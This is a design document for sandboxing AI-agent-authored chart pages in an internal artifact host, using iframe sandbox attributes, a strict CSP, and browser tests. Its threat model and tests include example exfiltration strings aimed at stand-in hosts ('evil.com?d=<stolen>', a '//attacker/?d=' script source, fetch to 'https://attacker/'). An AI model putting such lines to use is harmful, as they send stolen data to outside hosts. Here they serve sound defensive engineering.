# Visual host — running agent-authored charts safely

**Status:** approved, not yet implemented
**Date:** 2026-07-14

## Problem

Portico already hosts HTML artifacts: `portico__publish_html` stores a document and
returns a login-gated URL, and Jean already reaches that tool through the portico
plugin (`jean.json`). The plumbing works. What does not work is the thing the artifact
host exists for — **visualizations**.

The artifact CSP (`src/interface/http/artifact-routes.ts`) is:

```
default-src 'none'; img-src data:; style-src 'unsafe-inline'; font-src data:;
base-uri 'none'; form-action 'none'; frame-ancestors 'none'
```

There is no `script-src`, so `default-src 'none'` blocks **all** JavaScript, and no
external origin is reachable. Static HTML, CSS, and inline SVG render; ECharts, D3,
Mermaid, Chart.js, and every CDN do not. An agent asked for a chart today publishes a
page that renders nothing.

That CSP was a deliberate, correct instinct — LLM-authored HTML is untrusted, and the
comment on it says the page must not be able to "exfiltrate, phone home, or be turned
into a phishing page." This design keeps that guarantee while letting charts run.

## Goal

A Jean agent can publish an interactive chart or diagram and paste a
`https://portico.int.okadoc.net/visual/<id>` link into a Slack thread. Any signed-in
Okadoc user opens it and sees a working visualization. The page's JavaScript cannot
reach the network, read a session cookie, or escape its frame.

## Non-goals

- **Per-user artifact ownership.** Jean authenticates with a single shared
  `PORTICO_ACCESS_TOKEN`, so every visual it publishes is owned by one portico
  identity. `visibility: "private"` is therefore meaningless for Jean-published
  visuals, and `list_artifacts` shows the whole team's. Jean will publish with
  `visibility: "authenticated"`. Per-Slack-user tokens are separate, later work.
- **Slack link previews.** Visual URLs are login-gated, so they will not unfurl.
- **Live data.** A published page is a snapshot. It cannot call back into portico or
  any API — `connect-src 'none'` is load-bearing, not an oversight.

## Design

### Routes

| Route | Serves | Trust |
|---|---|---|
| `GET /visual/:id` | Portico-owned **shell**: login gate, title, share/revoke bar, and the `<iframe>` | Trusted (portico origin) |
| `GET /visual/:id/raw` | The stored artifact bytes, framed by the shell | **Untrusted (opaque origin)** |
| `GET /vendor/<lib>-<version>.min.js` | Vendored ECharts + Mermaid, via `express.static` | Trusted, immutable |
| `GET /a/:id` | `301` → `/visual/:id` | Keeps already-shared links working |

Both `/visual/:id` and `/visual/:id/raw` are session-gated exactly as `/a/:id` is
today, and `/raw` re-runs the full visibility check — it is a directly reachable URL,
not an internal detail. Redirect unauthenticated users to
`/login?next=<the /visual/:id shell>`, never to `/raw`.

### The sandbox is the security boundary

The shell embeds the artifact as:

```html
<iframe src="/visual/:id/raw" sandbox="allow-scripts"></iframe>
```

`allow-scripts` **without** `allow-same-origin` gives the framed document an *opaque*
origin. Consequences, and they are the entire point:

- It cannot read portico's session cookie or `localStorage` — it is not on portico's
  origin as far as script is concerned.
- It cannot see or touch the parent document.
- No `allow-top-navigation`, so it cannot redirect the tab to `evil.com?d=<stolen>`.
- No `allow-forms`, `allow-popups`, or `allow-modals`.

**`allow-scripts` and `allow-same-origin` must never both be set.** That pairing lets
the framed page reach into its own DOM and remove the `sandbox` attribute, defeating
the whole design. This is the single most important invariant here.

### CSP on `/visual/:id/raw`

```
default-src 'none';
script-src 'unsafe-inline' https://portico.int.okadoc.net;
style-src  'unsafe-inline' https://portico.int.okadoc.net;
img-src data: blob:;
font-src data:;
connect-src 'none';
base-uri 'none';
form-action 'none';
frame-ancestors https://portico.int.okadoc.net
```

- `connect-src 'none'` kills `fetch`, XHR, WebSocket, `sendBeacon`.
- No external origin appears anywhere, so `<script src="//attacker/?d=…">` — an
  outbound GET carrying stolen data in its query string — has nowhere to point. This
  is why CDNs are banned outright rather than allowlisted: *any* permitted external
  origin is an exfiltration channel regardless of how tight `connect-src` is.
- `'unsafe-inline'` on `script-src` is what lets the agent configure a chart with real
  data. It is safe here only because the sandbox denies that script anything worth
  stealing and the CSP denies it any way to send it.

Two directives that are easy to get wrong, and both fail at runtime rather than at
compile time:

1. **`frame-ancestors` must change from `'none'` to the portico origin.** Left as
   `'none'` it blocks *our own shell* from framing the artifact, and nothing renders.
2. **CSP `'self'` is unreliable in an opaque-origin sandbox.** The policy names the
   origin explicitly instead of relying on `'self'`. Derive it from `settings.baseUrl`.
   This must be confirmed in a real browser (see Testing).

The shell page itself gets its own strict policy — `default-src 'none'; script-src
'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; frame-src 'self'`.

### Vendored libraries

Served from a dedicated `vendor/` directory at the repo root via
`express.static("/vendor", …)`. **Not** out of `web/dist`: that directory only exists
after a portal build, so vendoring through it would leave `make dev` silently unable
to render any chart.

- `/vendor/echarts-5.6.0.min.js` — data charts: line, bar, pie, scatter, heatmap,
  sankey, gauge, treemap, geo. Interactive (hover, zoom, drill-down) out of the box.
- `/vendor/mermaid-11.4.1.min.js` — diagrams: flowchart, sequence, ERD, gantt.

Paths are **version-pinned and immutable**. A published artifact hard-codes the path it
was written against, so replacing a lib in place would silently break visuals published
months earlier. Upgrades *add* a file; they never overwrite or delete one.

`/vendor/*` is served **unauthenticated**. The files are public open-source bundles
holding nothing secret, and gating them would couple asset loading to a session cookie
being carried into an opaque-origin iframe — an avoidable failure mode for zero benefit.

Subresource Integrity is deliberately not used: SRI hardens scripts fetched from a
third-party origin, and this design permits no third-party origin at all. The bundles
are same-origin, version-pinned, and served from bytes we deploy.

### Tool surface

Keep the single `portico__publish_html` tool — a second `publish_visual` tool would be
near-identical and would only split the agent's attention between two overlapping
options. Changes:

- `ArtifactsService.url()` (`src/application/artifacts-service.ts`) returns
  `${baseUrl}/visual/${id}` instead of `${baseUrl}/a/${id}`. This is the only place the
  URL is constructed.
- The tool description gains: the vendored lib list with exact `/vendor/` paths, and
  the hard rules — no CDN, no `fetch`, no external fonts or images, inline `<script>`
  is fine.

### Agent guidance (oka-skills, follow-up change)

A skill in the portico plugin, firing on chart / graph / dashboard / diagram /
visualize. It carries the thing that actually decides whether this works in practice: a
known-good page template with correct `<script src="/vendor/…">` tags, a worked ECharts
example with real data, a Mermaid example, and an explicit *these will silently fail*
list. Without it the agent's default instinct is a jsDelivr CDN link, which the CSP
kills, and the user gets a blank page with no error.

## Testing

Vitest, in-memory, no browser — covers the wiring:

- `url()` returns `/visual/:id`.
- `/a/:id` 301s to `/visual/:id`.
- `/visual/:id` and `/visual/:id/raw` both redirect anonymous users to `/login`.
- `/raw` enforces visibility, revocation, and expiry (the existing `/a/:id` cases).
- The `/raw` CSP header is exactly as specified, and `frame-ancestors` is **not**
  `'none'`.
- The shell's iframe has `sandbox="allow-scripts"` and **not** `allow-same-origin`.

Playwright, real browser — covers the security boundary, because every claim above is a
claim about browser behavior that a header assertion cannot prove:

- An ECharts chart and a Mermaid diagram actually render.
- `fetch('https://attacker/')` from the artifact is blocked.
- An external `<script src>` is blocked.
- A top-frame navigation attempt does not move the tab.
- The framed document cannot read `document.cookie`.

This adds a dev dependency and a CI browser install to a repo that today needs neither.
Accepted deliberately: without it we would be shipping a security boundary we have
never observed hold, where a wrong directive or a typo'd sandbox attribute passes CI
green.

## Rollout

Non-breaking. Existing artifacts are static HTML and render unchanged inside the
sandboxed iframe; `/a/:id` keeps working via redirect. No change to the MCP token,
the gateway, the portal, or the stored schema.

Jean requires **no code change** — the portico plugin is already registered in
`jean.json`, so the capability arrives with portico's deploy plus the skill.

## Sequencing

1. **Portico** (this branch): routes, shell, CSP, sandbox, vendored libs, `url()`,
   tool description, vitest + Playwright.
2. **oka-skills**: the visualization skill, written against the live CSP once the URLs
   are real and testable.
